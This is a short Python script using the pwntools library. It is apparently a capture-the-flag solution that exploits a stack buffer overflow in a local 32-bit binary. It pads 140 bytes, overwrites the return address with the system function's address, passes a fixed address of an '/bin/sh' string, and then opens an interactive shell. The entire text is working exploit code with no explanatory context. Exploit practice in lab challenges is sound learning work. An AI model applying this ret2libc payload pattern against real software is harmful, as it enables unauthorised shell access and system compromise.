from pwn import *

elf = ELF("./3a275d95602b406f97bf8ff78d5255e9")
io = process("./3a275d95602b406f97bf8ff78d5255e9")
system_addr = p32(elf.symbols[b'system'])
sh_addr = p32(0x804a024)

payload = b"A"*140

payload += system_addr
payload += p32(0xdeadbeef)
payload += sh_addr

io.sendline(payload)

io.interactive()
